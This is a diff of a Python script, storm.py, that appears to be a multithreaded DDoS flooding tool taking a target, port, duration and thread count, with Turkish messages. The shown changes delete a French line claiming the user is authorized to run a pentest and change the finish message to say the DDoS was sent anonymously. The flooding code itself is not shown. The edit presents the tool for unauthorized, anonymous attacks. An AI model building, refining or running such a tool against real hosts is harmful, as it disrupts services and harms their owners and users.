@@ -1,4 +1,3 @@
-#!/data/data/com.termux/files/usr/bin/python
 import socket,random,time,os,sys,threading,struct
 
 os.system("clear")
@@ -9,8 +8,7 @@ print(" / / / / / / /_/ />  <(__  ) /_/ / /_/ / /_/ / /_/ /")
 print("/_/_/_/ /_/\\__,_/_/|_/____/\\__, /\\__,_/\\__,_/\\__,_/")
 print("                           /_/\033[0m")
 print("\033[93mdeveloper:@linuxsquad\033[0m")
-print("\033[92mpython storm.py <HEDEF> <PORT> [SURE] [THREAD]\033[0m")
-print("\033[94mJ'ai la permission et je suis autorisé à effectuer ce pentest\033[0m\n")
+print("\n\033[92mpython storm.py <HEDEF> <PORT> [SURE] [THREAD]\033[0m\n")
 
 if len(sys.argv)<3:
     print("python storm.py <HEDEF> <PORT> [SURE] [THREAD]");sys.exit(1)
@@ -95,6 +93,6 @@ print(f"\033[93m[+] {aktif} thread aktif\033[0m")
 
 try:
     time.sleep(SURE)
-    print("\033[92m[+] SALDIRI TAMAMLANDI!\033[0m")
+    print("\033[92m[+] DDOS ANONİM ŞEKİLDE GÖNDERİLDİ!\033[0m")
 except KeyboardInterrupt:
     print("\033[91m[!] DURDURULDU\033[0m")
